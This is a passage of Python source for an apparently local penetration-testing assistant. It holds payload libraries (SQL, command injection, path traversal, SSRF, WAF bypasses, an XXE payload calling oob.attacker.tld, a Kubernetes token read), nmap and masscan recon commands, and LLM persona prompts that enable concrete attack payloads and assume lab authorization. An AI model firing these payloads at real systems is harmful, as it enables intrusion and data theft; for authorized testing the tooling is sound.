            },
            {
                "name": "S3 bucket policy misconfig",
                "payload": "aws s3 ls s3://target-bucket --no-sign-request",
                "notes": "Enumerate publicly listable buckets.",
                "severity": "high",
                "tags": ["aws", "s3"],
                "provider": "aws",
            },
            {
                "name": "K8s service account token abuse",
                "payload": "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=https://kubernetes.default.svc auth can-i --list",
                "notes": "From inside a pod, check effective RBAC.",
                "severity": "critical",
                "tags": ["k8s", "rbac"],
                "provider": "k8s",
            },
        ],

        "evasion": [
            {
                "name": "Chunked transfer smuggling",
                "payload": "Transfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: internal",
                "notes": "CL.TE / TE.CL desync primitives.",
                "severity": "high",
                "tags": ["smuggling", "http"],
            },
            {
                "name": "Unicode normalization WAF bypass",
                "payload": "＜script＞alert(1)＜/script＞",
                "notes": "Fullwidth characters normalized by backend but not WAF.",
                "severity": "medium",
                "tags": ["unicode", "waf-bypass"],
            },
            {
                "name": "Case + whitespace mutation",
                "payload": "SeLeCt/**/1/**/FrOm/**/dual",
                "notes": "Comment injection and case variation for keyword filters.",
                "severity": "medium",
                "tags": ["waf-bypass", "sql"],
            },
            {
                "name": "Double URL encoding",
                "payload": "%2527%2520OR%25201%253D1--",
                "notes": "When decoding happens twice across layers.",
                "severity": "medium",
                "tags": ["encoding", "waf-bypass"],
            },
            {
                "name": "HTTP parameter pollution",
                "payload": "?id=1&id=2' UNION SELECT ...",
                "notes": "Backend picks one value, WAF inspects another.",
                "severity": "medium",
                "tags": ["hpp", "waf-bypass"],
            },
        ],
    }

    @classmethod
    def categories(cls) -> List[str]:
        return sorted(cls.CATEGORIES.keys())

    @classmethod
    def get(cls, category: str) -> List[Dict[str, Any]]:
        return cls.CATEGORIES.get(category.lower(), [])

    @classmethod
    def all_payloads(cls) -> List[Dict[str, Any]]:
        out: List[Dict[str, Any]] = []
        for cat, items in cls.CATEGORIES.items():
            for item in items:
                out.append({**item, "category": cat})
        return out

    @classmethod
    def search(cls, keyword: str) -> List[Dict[str, Any]]:
        kw = (keyword or "").strip().lower()
        if not kw:
            return []
        tokens = [t for t in re.split(r"\s+", kw) if t]
        results: List[Dict[str, Any]] = []
        for cat, items in cls.CATEGORIES.items():
            for item in items:
                blob = " ".join([
                    item.get("name", ""),
                    item.get("payload", ""),
                    item.get("notes", ""),
                    " ".join(item.get("tags", [])),
                    item.get("dbms", ""),
                    item.get("engine", ""),
                    item.get("provider", ""),
                    item.get("lang", ""),
                ]).lower()
                if all(tok in blob for tok in tokens):
                    results.append({**item, "category": cat})
        return results

    @classmethod
    def count(cls) -> int:
        return sum(len(v) for v in cls.CATEGORIES.values())

    @classmethod
    def render_for_prompt(cls, category: Optional[str] = None,
                          limit: int = 8) -> str:
        """Compact textual view of payloads to inject into a system prompt."""
        if category:
            items = [{**p, "category": category} for p in cls.get(category)]
        else:
            items = cls.all_payloads()
        items = items[:limit]
        lines = []
        for p in items:
            lines.append(
                f"- [{p['category']}] {p['name']} -> {p['payload'][:120]}"
            )
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Threat intelligence
# ---------------------------------------------------------------------------

def _load_intel_file() -> List[Dict[str, Any]]:
    if not KB_FILE.exists():
        return []
    try:
        with KB_FILE.open("r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, dict):
            return data.get("vulnerabilities", []) or []
        if isinstance(data, list):
            return data
    except (json.JSONDecodeError, OSError) as exc:
        logger.warning("Intel load failed: %s", exc)
    return []


def load_threat_intel() -> List[Dict[str, Any]]:
    """Cached accessor. Cleared explicitly after sync."""
    if _STREAMLIT_AVAILABLE:
        return _cached_intel()
    return _load_intel_file()


if _STREAMLIT_AVAILABLE:
    @st.cache_data(ttl=1800, show_spinner=False)
    def _cached_intel() -> List[Dict[str, Any]]:
        return _load_intel_file()
else:
    def _cached_intel() -> List[Dict[str, Any]]:
        return _load_intel_file()


def _clear_intel_cache() -> None:
    if _STREAMLIT_AVAILABLE:
        try:
            _cached_intel.clear()
        except Exception:
            pass


def _http_get(url: str, headers: Optional[Dict[str, str]] = None,
              retries: int = MAX_RETRIES) -> Optional[requests.Response]:
    hdrs = headers or {"User-Agent": f"{APP_NAME}/{APP_VERSION}"}
    for attempt in range(1, retries + 1):
        try:
            r = requests.get(url, timeout=HTTP_TIMEOUT, headers=hdrs)
            if r.status_code == 200:
                return r
            if r.status_code == 429:
                wait = float(r.headers.get("Retry-After", BACKOFF_BASE ** attempt))
                time.sleep(min(wait, 30.0))
                continue
            logger.warning("HTTP %s for %s", r.status_code, url)
        except requests.exceptions.Timeout:
            logger.warning("Timeout on %s (attempt %d)", url, attempt)
        except requests.exceptions.ConnectionError:
            logger.warning("Connection error on %s (attempt %d)", url, attempt)
        except requests.exceptions.RequestException as exc:
            logger.warning("Request error: %s", exc)
        if attempt < retries:
            time.sleep(BACKOFF_BASE ** attempt)
    return None


def sync_cisa_feed() -> Tuple[bool, str]:
    r = _http_get(CISA_FEED_URL)
    if not r:
        return False, "CISA sync failed: network unreachable"
    try:
        payload = r.json()
        items = payload.get("vulnerabilities", [])[:800]
        if not items:
            return False, "Empty CISA response"
        existing = _load_intel_file()
        seen = {i.get("cveID") for i in existing if i.get("cveID")}
        fresh = []
        for item in items:
            cve = item.get("cveID")
            if cve and cve not in seen:
                item["source"] = "CISA-KEV"
                fresh.append(item)
        merged = (fresh + existing)[:1500]
        with KB_FILE.open("w", encoding="utf-8") as fh:
            json.dump(
                {"vulnerabilities": merged, "last_sync": utc_now()},
                fh, indent=2, ensure_ascii=False,
            )
        _clear_intel_cache()
        return True, f"Synced {len(fresh)} new entries ({len(merged)} cached)"
    except (json.JSONDecodeError, KeyError) as exc:
        logger.error("CISA parse error: %s", exc)
        return False, f"Parse error: {exc}"


def fetch_nvd_cve(cve_id: str) -> Optional[Dict[str, Any]]:
    cve_id = (cve_id or "").strip().upper()
    if not cve_id.startswith("CVE-"):
        return None
    r = _http_get(f"{NVD_API_URL}?cveId={cve_id}", retries=2)
    if not r:
        return None
    try:
        vulns = r.json().get("vulnerabilities", [])
        if not vulns:
            return None
        cve = vulns[0].get("cve", {})
        metrics = cve.get("metrics", {})
        score, vector = 0.0, ""
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            entries = metrics.get(key) or []
            if entries:
                data = entries[0].get("cvssData", {})
                score = data.get("baseScore", 0.0)
                vector = data.get("vectorString", "")
                break
        description = next(
            (d.get("value", "") for d in cve.get("descriptions", [])
             if d.get("lang") == "en"),
            "",
        )
        return {
            "cve_id": cve_id,
            "description": description,
            "cvss_score": score,
            "cvss_vector": vector,
            "published": cve.get("published", ""),
            "last_modified": cve.get("lastModified", ""),
            "references": [
                r.get("url") for r in cve.get("references", []) if r.get("url")
            ][:10],
        }
    except (json.JSONDecodeError, KeyError, IndexError) as exc:
        logger.error("NVD parse error: %s", exc)
        return None


def search_threat_intel(keyword: str, limit: int = 50) -> List[Dict[str, Any]]:
    kw = (keyword or "").strip().lower()
    if not kw:
        return []
    results = []
    for item in load_threat_intel():
        blob = " ".join([
            item.get("cveID", ""),
            item.get("vulnerabilityName", ""),
            item.get("shortDescription", ""),
            item.get("vendorProject", ""),
            item.get("product", ""),
        ]).lower()
        if kw in blob:
            results.append(item)
        if len(results) >= limit:
            break
    return results


# ---------------------------------------------------------------------------
# API testing helpers
# ---------------------------------------------------------------------------

class APITester:
    @staticmethod
    def rest_methodology() -> List[str]:
        return [
            "Enumerate endpoints via OpenAPI/Swagger, JS bundles, and OPTIONS",
            "Fingerprint auth scheme: JWT, session, API key, OAuth, HMAC",
            "Test object-level authorization on every ID-bearing endpoint",
            "Test function-level authorization on admin/internal routes",
            "Fuzz parameters with type confusion (string vs array vs object)",
            "Test content-type confusion (JSON vs form vs XML)",
            "Test HTTP verb tampering (GET/POST/PUT/PATCH/DELETE/OPTIONS)",
            "Test HTTP parameter pollution and duplicate keys",
            "Test rate limiting and account lockout behavior",
            "Test mass assignment by injecting extra fields in bodies",
            "Test server-side request forgery in URL-accepting fields",
            "Test pagination and sorting for injection and DoS",
            "Test error responses for stack traces and internal paths",
            "Test CORS by sending arbitrary Origin headers",
            "Test cache poisoning via X-Forwarded-* and Host headers",
        ]

    @staticmethod
    def graphql_methodology() -> List[str]:
        return [
            "Attempt introspection query to dump full schema",
            "If introspection blocked, use field suggestion errors",
            "Test alias-based batching to bypass rate limits",
            "Test deeply nested queries for resource exhaustion",
            "Test circular fragments for DoS",
            "Enumerate node(id:) global object identifiers for IDOR",
            "Test mutation abuse for privilege escalation",
            "Test URL-typed input fields for SSRF",
            "Test subscriptions for unauthorized data streams",
            "Test persisted query bypass (APQ) for cache poisoning",
            "Test directive abuse (@include/@skip) for filter bypass",
            "Test GraphQL CSRF via GET-based mutations",
        ]

    @staticmethod
    def auth_checklist() -> List[str]:
        return [
            "Request protected endpoints without Authorization header",
            "Send expired JWT and observe refresh behavior",
            "Tamper JWT payload (sub, role, scope) and re-sign if weak",
            "Attempt alg=none and algorithm confusion attacks",
            "Test JWT kid injection (path traversal, SQL, SSRF)",
            "Test OAuth redirect_uri validation edge cases",
            "Test OAuth state parameter reuse and absence",
            "Test PKCE downgrade and code_challenge_method mismatch",
            "Test session fixation and session rotation on login",
            "Test password reset token predictability and reuse",
            "Test MFA bypass via response manipulation",
            "Test account enumeration via response timing and text",
            "Test IDOR on user-scoped resources",
            "Test BOLA across tenants where applicable",
        ]

    @staticmethod
    def common_payloads() -> Dict[str, List[str]]:
        return {
            "sqli": [
                "'", "\"", "' OR '1'='1", "1' AND SLEEP(5)--",
                "' UNION SELECT NULL--", "';WAITFOR DELAY '0:0:5'--",
            ],
            "nosql": [
                '{"$ne": null}', '{"$gt": ""}',
                '{"$regex": ".*"}', '{"$where": "sleep(5000)"}',
                '{"username": {"$in": ["admin"]}}',
            ],
            "command": [
                ";id", "|id", "$(id)", "`id`", "&id",
                "%0aid", "\\nid",
            ],
            "path": [
                "../../../etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..\\..\\..\\windows\\win.ini",
                "/proc/self/environ",
                "php://filter/convert.base64-encode/resource=index.php",
            ],
            "ssrf": [
                "http://127.0.0.1", "http://localhost",
                "http://[::1]", "http://169.254.169.254",
                "http://2852039166", "http://0x7f000001",
                "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
            ],
            "xxe": [
                "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>",
                "<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://oob.attacker.tld/d\">%p;]>",
            ],
            "ssti": [
                "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
                "{{config}}", "{{self.__class__}}",
            ],
        }

    @staticmethod
    def generate_curl(method: str, url: str,
                      headers: Optional[Dict[str, str]] = None,
                      data: Optional[str] = None,
                      insecure: bool = False) -> str:
        parts = [f"curl -X {method.upper()} '{url}'"]
        for k, v in (headers or {}).items():
            parts.append(f"  -H '{k}: {v}'")
        if data:
            parts.append(f"  --data-raw '{data}'")
        if insecure:
            parts.append("  -k")
        parts.append("  -i")
        return " \\\n".join(parts)


# ---------------------------------------------------------------------------
# Reconnaissance helpers
# ---------------------------------------------------------------------------

class ReconHelper:
    @staticmethod
    def network_discovery(subnet: str = "192.168.1.0/24") -> List[Dict[str, str]]:
        try:
            ipaddress.ip_network(subnet, strict=False)
        except ValueError:
            subnet = "192.168.1.0/24"
        return [
            {"tool": "nmap-host-discovery",
             "cmd": f"nmap -sn -PE -PS443 -PA80 -PP {subnet}",
             "purpose": "Host discovery with mixed probes"},
            {"tool": "arp-scan",
             "cmd": "sudo arp-scan --localnet --retry=2",
             "purpose": "L2 discovery, bypasses ICMP filtering"},
            {"tool": "netdiscover",
             "cmd": f"sudo netdiscover -r {subnet} -P",
             "purpose": "Passive then active discovery"},
            {"tool": "fping-sweep",
             "cmd": f"fping -a -g {subnet} 2>/dev/null",
             "purpose": "Fast ICMP sweep"},
        ]

    @staticmethod
    def port_scanning(target: str = "192.168.1.1") -> List[Dict[str, str]]:
        return [
            {"tool": "nmap-fast",
             "cmd": f"nmap -T4 -F --open {target}",
             "purpose": "Top-100 ports, open only"},
            {"tool": "nmap-full-tcp",
             "cmd": f"nmap -p- -T4 --open -sS {target}",
             "purpose": "Full TCP SYN scan"},
            {"tool": "nmap-service",
             "cmd": f"nmap -sV -sC -p- -T4 --open {target}",
             "purpose": "Service and default script scan"},
            {"tool": "nmap-udp",
             "cmd": f"sudo nmap -sU --top-ports 200 --open {target}",
             "purpose": "Top UDP ports"},
            {"tool": "nmap-vuln",
             "cmd": f"nmap --script vuln -p- {target}",
             "purpose": "NSE vulnerability scripts"},
            {"tool": "masscan",
             "cmd": f"sudo masscan -p1-65535 {target} --rate=2000 --wait 2",
             "purpose": "High-speed discovery, then nmap -sV"},
        ]

    @staticmethod
    def web_recon(target_url: str = "http://target.tld") -> List[Dict[str, str]]:
        return [
            {"tool": "httpx",
             "cmd": f"httpx -u {target_url} -title -tech-detect -status-code -follow-redirects",
             "purpose": "Fast fingerprint and liveness"},
            {"tool": "whatweb",
             "cmd": f"whatweb -a 3 --log-brief=whatweb.txt {target_url}",
             "purpose": "Aggressive technology fingerprint"},
            {"tool": "gobuster-dirs",
             "cmd": f"gobuster dir -u {target_url} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 40 -x php,html,js,json",
             "purpose": "Directory and extension brute force"},
            {"tool": "feroxbuster",
             "cmd": f"feroxbuster -u {target_url} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,json -r -t 50",
             "purpose": "Recursive content discovery"},
            {"tool": "nuclei",
             "cmd": f"nuclei -u {target_url} -severity critical,high,medium -rl 100 -c 25",
             "purpose": "Template-based vulnerability scan"},
            {"tool": "ffuf-params",
             "cmd": f"ffuf -u '{target_url}/?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0",
             "purpose": "Hidden parameter discovery"},
            {"tool": "katana",
             "cmd": f"katana -u {target_url} -d 3 -jc -kf all -silent",
             "purpose": "Crawling and endpoint discovery"},
            {"tool": "subfinder",
             "cmd": f"subfinder -d {target_url.replace('http://','').replace('https://','').split('/')[0]} -silent",
             "purpose": "Subdomain enumeration"},
        ]

    @staticmethod
    def iot_specific(target: str = "192.168.1.1") -> List[Dict[str, str]]:
        return [
            {"tool": "mqtt-enum",
             "cmd": f"nmap -p1883,8883 --script mqtt-subscribe {target}",
             "purpose": "MQTT broker anonymous access check"},
            {"tool": "upnp-enum",
             "cmd": f"nmap -sU -p1900 --script upnp-info {target}",
             "purpose": "UPnP device discovery"},
            {"tool": "coap-enum",
             "cmd": f"nmap -sU -p5683,5684 --script coap-resources {target}",
             "purpose": "CoAP resource enumeration"},
            {"tool": "rtsp-enum",
             "cmd": f"nmap -p554 --script rtsp-url-brute {target}",
             "purpose": "IP camera stream discovery"},
            {"tool": "modbus-enum",
             "cmd": f"nmap -p502 --script modbus-discover {target}",
             "purpose": "ICS Modbus enumeration"},
            {"tool": "s7-enum",
             "cmd": f"nmap -p102 --script s7-info {target}",
             "purpose": "Siemens S7 PLC info"},
            {"tool": "telnet-check",
             "cmd": f"nmap -p23 --script telnet-ntlm-info,telnet-encryption {target}",
             "purpose": "Telnet exposure and info leak"},
            {"tool": "firmware-extract",
             "cmd": "binwalk -Me firmware.bin && grep -rE '(admin|password|api[_-]?key)' _firmware.bin.extracted/",
             "purpose": "Offline firmware analysis"},
        ]


# ---------------------------------------------------------------------------
# Evidence management
# ---------------------------------------------------------------------------

class EvidenceManager:
    ALLOWED_MIME_PREFIXES = ("image/", "text/", "application/pdf",
                             "application/json", "application/xml")

    @staticmethod
    def _is_allowed(mime: str) -> bool:
        return any(mime.startswith(p) for p in EvidenceManager.ALLOWED_MIME_PREFIXES)

    @staticmethod
    def _try_ocr(filepath: Path) -> str:
        """Best-effort OCR via pytesseract if installed."""
        try:
            import pytesseract  # type: ignore
        except ImportError:
            return ""
        try:
            return pytesseract.image_to_string(str(filepath)) or ""
        except Exception as exc:
            logger.warning("OCR failed: %s", exc)
            return ""

    @staticmethod
    def save_upload(uploaded: Any, session_id: str,
                    caption: str = "", linked_cve: str = "") -> Optional[EvidenceItem]:
        if uploaded is None:
            return None
        try:
            content = uploaded.getvalue()
            if not content:
                return None

            mime = getattr(uploaded, "type", "application/octet-stream") or "application/octet-stream"
            if not EvidenceManager._is_allowed(mime):
                logger.warning("Rejected evidence type: %s", mime)
                return None

            suffix = Path(uploaded.name).suffix.lower() or ".bin"
            stem = safe_name(Path(uploaded.name).stem)[:60]
            stamp = utc_now().replace(":", "-").replace("+", "Z")
            fname = f"{stamp}_{stem}{suffix}"
            fpath = EVIDENCE_DIR / fname

            with fpath.open("wb") as fh:
                fh.write(content)

            extracted = ""
            if mime.startswith("image/"):
                extracted = EvidenceManager._try_ocr(fpath)

            return EvidenceItem(
                evidence_id=str(uuid.uuid4()),
                filename=uploaded.name,
                filepath=str(fpath),
                mime_type=mime,
                size_bytes=len(content),
                caption=caption,
                linked_cve=linked_cve,
                extracted_text=extracted,
            )
        except (OSError, AttributeError) as exc:
            logger.error("Evidence save failed: %s", exc)
            return None

    @staticmethod
    def is_image(mime: str) -> bool:
        return (mime or "").startswith("image/")

    @staticmethod
    def read_bytes(filepath: str) -> Optional[bytes]:
        try:
            with open(filepath, "rb") as fh:
                return fh.read()
        except OSError:
            return None

    @staticmethod
    def safe_delete(filepath: str) -> None:
        try:
            p = Path(filepath)
            if p.exists() and p.is_file():
                p.unlink()
        except OSError as exc:
            logger.warning("Evidence delete failed: %s", exc)


# = ED  PART 2 =
# === PART 3 ===

"""
Persona engine, prompt engineering, LLM bridge, and report generator.
"""

import io
import textwrap

try:
    import markdown as _md_lib
    _MD_AVAILABLE = True
except ImportError:
    _md_lib = None
    _MD_AVAILABLE = False


# ---------------------------------------------------------------------------
# Operator personas
# ---------------------------------------------------------------------------

PERSONAS: Dict[str, Dict[str, Any]] = {
    "apex-sec": {
        "label": "APEX-SEC (Default)",
        "icon": "🛡️",
        "prompt": (
            "You are APEX-SEC, a principal security researcher and lead "
            "penetration tester with 15+ years across offensive and defensive "
            "operations. You have authored public exploits, led red teams at "
            "regulated enterprises, and trained SOC analysts.\n\n"
            "Working style:\n"
            "- Move step by step. Never dump a 200-line script on the user.\n"
            "- Confirm scope and authorization before any active technique.\n"
            "- Explain the WHY behind every command, then give the command.\n"
            "- When the user pastes an error, diagnose it before suggesting "
            "  the next move. WAF blocks, encoding issues, privesc barriers, "
            "  and logic flaws all deserve a reasoned analysis.\n"
            "- Reference real CVEs, MITRE ATT&CK IDs, and tool flags by name.\n"
            "- Think like an attacker and a defender at the same time.\n"
            "- If the user reports a finding, pivot toward a clean write-up."
        ),
    },
    "red-team-lead": {
        "label": "Red Team Lead",
        "icon": "🔴",
        "prompt": (
            "You lead authorized adversary simulation engagements. Your "
            "specialties: initial access (phishing, exposed services, supply "
            "chain), persistence, privilege escalation, lateral movement, C2 "
            "tradecraft (Cobalt Strike, Sliver, Mythic, Havoc), and OPSEC.\n\n"
            "You map every technique to MITRE ATT&CK. You state the "
            "authorization requirement before suggesting any TTP. You mirror "
            "real threat actor behavior rather than academic examples."
        ),
    },
    "blue-team-analyst": {
        "label": "Blue Team Analyst",
        "icon": "🔵",
        "prompt": (
            "You defend enterprise networks. Your tools: Sigma, YARA, Snort, "
            "Suricata, Splunk SPL, Elastic EQL, Sentinel KQL. You translate "
            "attacker TTPs into detection opportunities, write hunting "
            "hypotheses, and produce hardening guidance aligned with CIS "
            "Benchmarks and NIST 800-53.\n\n"
            "Every offensive technique you discuss ends with a detection or "
            "mitigation angle."
        ),
    },
    "bug-bounty-hunter": {
        "label": "Bug Bounty Hunter",
        "icon": "🎯",
        "prompt": (
            "You are a top-tier bug bounty hunter with seven figures of valid "
            "payouts across HackerOne, Bugcrowd, and Intigriti. You specialize "
            "in web, API, and mobile. Your edge is business logic, race "
            "conditions, and chained exploits that triagers cannot dismiss.\n\n"
            "You write reports that get accepted on first pass: clear title, "
            "impact first, minimal reproducer, video or curl proof, realistic "
            "CVSS. You know which programs pay and which do not."
        ),
    },
    "exploit-dev": {
        "label": "Exploit Developer",
        "icon": "💣",
        "prompt": (
            "You develop exploits for memory corruption and modern "
            "mitigations. Stack overflows, heap grooming, use-after-free, "
            "type confusion, integer overflows, ROP/JOP chains, ASLR/DEP/CFG "
            "bypasses, format strings, kernel primitives (Windows and Linux), "
            "and shellcode for x86, x64, and ARM64.\n\n"
            "You reason about mitigations before payload. You assume the "
            "user is in an authorized lab and building a real PoC."
        ),
    },
    "cloud-security": {
        "label": "Cloud Security Architect",
        "icon": "☁️",
        "prompt": (
            "You specialize in AWS, Azure, and GCP attack and defense. "
            "Privilege escalation through IAM misconfigurations, IMDS abuse, "
            "cross-account role chaining, S3/Blob/GCS exposures, Kubernetes "
            "RBAC and pod escape, serverless (Lambda, Cloud Functions) "
            "exploitation, and CI/CD pipeline compromise.\n\n"
            "You reference cloud-native tooling (Pacu, ScoutSuite, "
            "CloudFox, enumerate-iam, azurehound) and the detection signals "
            "each technique generates."
        ),
    },
    "api-security": {
        "label": "API Security Specialist",
        "icon": "🔌",
        "prompt": (
            "You break REST, GraphQL, gRPC, and WebSocket APIs. Focus on "
            "OWASP API Top 10: BOLA, BFLA, mass assignment, unrestricted "
            "resource consumption, broken auth, SSRF, and improper inventory "
            "management.\n\n"
            "For every finding you provide a raw HTTP request and a "
            "reproducer. You know how to test without tripping rate limits "
            "and how to chain BOLA into data exfiltration."
        ),
    },
    "iot-security": {
        "label": "IoT / Hardware Hacker",
        "icon": "📡",
        "prompt": (
            "You assess embedded systems and IoT. Firmware extraction "
            "(binwalk, firmware-mod-kit, unblob), UART/JTAG/SPI interfaces, "
            "secure boot bypass, MQTT/CoAP/Zigbee/BLE protocols, RTSP "
            "cameras, Modbus and S7 ICS, and hardware fault injection.\n\n"
            "You give lab-oriented instructions with equipment needed and "
            "safety warnings for hardware work."
        ),
    },
    "malware-analyst": {
        "label": "Malware Analyst",
        "icon": "🦠",
        "prompt": (
            "You reverse engineer malicious software. Static analysis with "
            "IDA Pro, Ghidra, and Binary Ninja. Dynamic analysis with "
            "Cuckoo, CAPE, ANY.RUN, Procmon, and Wireshark. Unpacking, "
            "deobfuscation, anti-analysis bypass, C2 protocol recovery, and "
            "YARA authoring.\n\n"
            "You extract IOCs methodically and always produce detection "
            "content from your findings."
        ),
    },
    "social-engineer": {
        "label": "Social Engineer",
        "icon": "🎭",
        "prompt": (
            "You conduct authorized social engineering for red teams. "
            "Pretext development, phishing infrastructure (GoPhish, "
            "Evilginx2, Modlishka), MFA fatigue, OAuth consent phishing, "
            "OSINT profiling, and physical intrusion scenarios.\n\n"
            "You work only under signed scope and you flag legal, ethical, "
            "and HR considerations at every stage."
        ),
    },
    "compliance-auditor": {
        "label": "Compliance Auditor",
        "icon": "📋",
        "prompt": (
            "You map technical findings to PCI-DSS 4.0, HIPAA, SOC 2, "
            "ISO 27001, GDPR, NIST CSF, and NIST 800-53. You translate "
            "vulnerabilities into business risk language that executives "
            "and auditors accept.\n\n"
            "You assign remediation priority by exploitability, blast "
            "radius, and regulatory exposure — not just CVSS."
        ),
    },
    "custom": {
        "label": "Custom Persona",
        "icon": "✏️",
        "prompt": "Follow the operator's custom instructions exactly.",
    },
}


def persona_label(key: str) -> str:
    p = PERSONAS.get(key) or PERSONAS["apex-sec"]
    return f"{p.get('icon', '🛡️')} {p.get('label', key)}"


# ---------------------------------------------------------------------------
# Prompt engineering
# ---------------------------------------------------------------------------

class PromptEngineer:

    INTEL_LIMIT = 20
    INTEL_ITEM_CHARS = 160
    PAYLOAD_LIMIT = 6

    @staticmethod
    def _engagement_block(target: TargetProfile) -> str:
        lines = ["## Engagement Context"]
        fields = [
            ("Target", target.ip_address or "unspecified"),
            ("Hostname", target.hostname or "unspecified"),
            ("OS", target.os_info or "unspecified"),
            ("MAC", target.mac_address or "unspecified"),
            ("Environment", target.environment or "lab"),
            ("Organization", target.organization or "unspecified"),
            ("Authorization", target.authorization_ref or "pending confirmation"),
            ("Scope", target.scope_notes or "not specified"),
        ]
        for k, v in fields:
            lines.append(f"- {k}: {v}")
        return "\n".join(lines)

    @classmethod
    def _intel_block(cls, items: List[Dict[str, Any]]) -> str:
        if not items:
            return ""
        lines = ["## Live CISA KEV Intelligence (recent)"]
        for item in items[:cls.INTEL_LIMIT]:
            cve = item.get("cveID", "N/A")
            name = (item.get("vulnerabilityName") or "Unknown")[:80]
            vendor = item.get("vendorProject", "")
            product = item.get("product", "")
            line = f"- {cve}: {name} ({vendor} {product})".strip()
            lines.append(line[:cls.INTEL_ITEM_CHARS])
        return "\n".join(lines)

    @classmethod
    def _payload_hint_block(cls) -> str:
        """Small curated hint so the model uses real techniques, not generic ones."""
        sample = PayloadLibrary.all_payloads()[:cls.PAYLOAD_LIMIT]
        if not sample:
            return ""
        lines = ["## Reference Techniques (use as inspiration, not verbatim)"]
        for p in sample:
            lines.append(f"- [{p['category']}] {p['name']}")
        return "\n".join(lines)

    @staticmethod
    def _directives(allow_payload: bool) -> str:
        payload_rule = (
            "Payload generation is ENABLED. Provide concrete, tested "
            "payloads with a one-line authorization reminder. Include "
            "encoding or bypass notes when relevant."
            if allow_payload else
            "Payload generation is DISABLED. Give conceptual and defensive "
            "guidance only. Do not produce executable attack payloads."
        )
        return textwrap.dedent(f"""
            ## Operational Directives

            1. Work in stages. One move at a time. Never paste a wall of code.
            2. Confirm scope and authorization before active testing.
            3. Structure every answer:
               a) Short read of the situation
               b) Numbered next steps
               c) Commands or payloads
               d) Verification step
            4. When the user pastes an error, diagnose before advancing.
            5. Reference real CVEs, MITRE ATT&CK IDs, and tool flags.
            6. When a finding is reported, offer a structured write-up.
            7. {payload_rule}
            8. Never fabricate CVE IDs, tool output, or command results.
            9. Flag destructive actions clearly before they are run.
        """).strip()

    @staticmethod
    def _report_skeleton() -> str:
        return textwrap.dedent("""
            ## Vulnerability Write-up Skeleton

            When the user reports a finding, produce:

            - Title
            - Severity (CVSS 3.1 score and vector)
            - Affected component (endpoint, parameter, or system)
            - Description
            - Steps to reproduce (numbered, minimal)
            - Proof of concept (raw request, response, or screenshot ref)
            - Impact (technical and business)
            - Remediation (specific and actionable)
            - References (CVE, OWASP, vendor advisory)
        """).strip()

    @classmethod
    def build(cls,
              persona_key: str,
              target: TargetProfile,
              allow_payload: bool,
              custom_prompt: str = "",
              cisa_items: Optional[List[Dict[str, Any]]] = None,
              include_payload_hints: bool = False) -> str:

        persona = PERSONAS.get(persona_key) or PERSONAS["apex-sec"]
        persona_text = persona["prompt"]
        if persona_key == "custom" and custom_prompt.strip():
            persona_text = custom_prompt.strip()

        blocks = [
            f"# Role\n{persona_text}",
            f"# {cls._engagement_block(target)}",
            f"# {cls._directives(allow_payload)}",
            f"# {cls._report_skeleton()}",
        ]

        intel = cls._intel_block(cisa_items or [])
        if intel:
            blocks.append(intel)

        if include_payload_hints:
            hints = cls._payload_hint_block()
            if hints:
                blocks.append(hints)

        blocks.append(
            "# Closing\nStay methodical. Favor clarity over cleverness. "
            "Confirm before acting. Keep the operator in the loop."
        )

        assembled = "\n\n".join(blocks)
        return truncate_text(assembled, MAX_PROMPT_CHARS)


# ---------------------------------------------------------------------------
# LLM bridge
# ---------------------------------------------------------------------------

class LLMBridge:

    def __init__(self, config: ConfigManager) -> None:
        self.config = config
        self._instance: Optional[Any] = None
        self._signature: str = ""
        self._last_error: str = ""

    # -- availability -----------------------------------------------------
    def is_available(self) -> bool:
        if not _OLLAMA_AVAILABLE:
            return False
        try:
            r = requests.get("http://localhost:11434/api/tags", timeout=3)
            return r.status_code == 200
        except requests.exceptions.RequestException:
            return False

    def list_local_models(self) -> List[str]:
        try:
            r = requests.get("http://localhost:11434/api/tags", timeout=5)
            if r.status_code != 200:
                return []
            data = r.json()
            return [m.get("name", "") for m in data.get("models", [])]
        except (requests.exceptions.RequestException, json.JSONDecodeError):
            return []

    # -- instance lifecycle ----------------------------------------------
    def _signature_for(self, system_prompt: str) -> str:
        parts = "|".join([
            str(self.config.get("model")),
            str(self.config.get("temperature")),
            str(self.config.get("top_p")),
            str(self.config.get("num_predict")),
            hashlib.sha1(system_prompt.encode("utf-8")).hexdigest(),
        ])
        return hashlib.sha1(parts.encode("utf-8")).hexdigest()

    def _build(self, system_prompt: str) -> Optional[Any]:
        if not _OLLAMA_AVAILABLE:
            self._last_error = (
                "LangChain Ollama not installed. Run: "
                "pip install langchain-community"
            )
            return None
        try:
            return Ollama(
                model=str(self.config.get("model")),
                system=system_prompt,
                temperature=float(self.config.get("temperature")),
                top_p=float(self.config.get("top_p")),
                num_predict=int(self.config.get("num_predict")),
            )
        except Exception as exc:
            self._last_error = f"LLM init failed: {exc}"
            logger.error(self._last_error)
            return None

    def get_instance(self, system_prompt: str) -> Optional[Any]:
        sig = self._signature_for(system_prompt)
        if self._instance is not None and self._signature == sig:
            return self._instance
        self._instance = self._build(system_prompt)
        self._signature = sig if self._instance else ""
        return self._instance

    def invalidate(self) -> None:
        self._instance = None
        self._signature = ""
        self._last_error = ""

    @property
    def last_error(self) -> str:
        return self._last_error

    # -- generation -------------------------------------------------------
    def generate(self, prompt: str, system_prompt: str) -> Tuple[bool, str]:
        llm = self.get_instance(system_prompt)
        if llm is None:
            friendly = self._last_error or (
                "AI engine unavailable. Start Ollama:\n"
                "  1) ollama serve\n"
                "  2) ollama pull llama3\n"
                "  3) Reload the page"
            )
            return False, friendly

        try:
            response = llm.invoke(prompt)
